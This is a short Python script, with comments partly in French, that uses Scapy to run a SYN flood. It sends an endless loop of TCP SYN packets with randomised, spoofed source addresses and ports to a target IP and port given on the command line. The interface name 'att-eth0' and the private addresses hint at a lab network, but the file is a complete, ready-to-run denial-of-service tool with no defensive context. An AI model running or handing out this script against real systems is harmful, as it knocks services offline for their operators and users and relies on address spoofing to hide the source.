#!/usr/bin/env python3
# Usage: python3 dos_syn_flood.py <target_ip> <port> <iface>
# Exemple: python3 dos_syn_flood.py 10.0.1.10 80 att-eth0

import sys, random, time
from scapy.all import IP, TCP, send, conf

def synflood(dst_ip, dst_port, iface):
    conf.iface = iface
    while True:
        src_port = random.randint(1024, 65535)
        src_ip = f"10.0.2.{random.randint(100,250)}"  # faux IPs du sous-réseau (ou laisser l'IP réelle)
        pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=random.randint(0,0xFFFF))
        send(pkt, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: syn_flood.py <target_ip> <port> <iface>")
        sys.exit(1)
    synflood(sys.argv[1], int(sys.argv[2]), sys.argv[3])
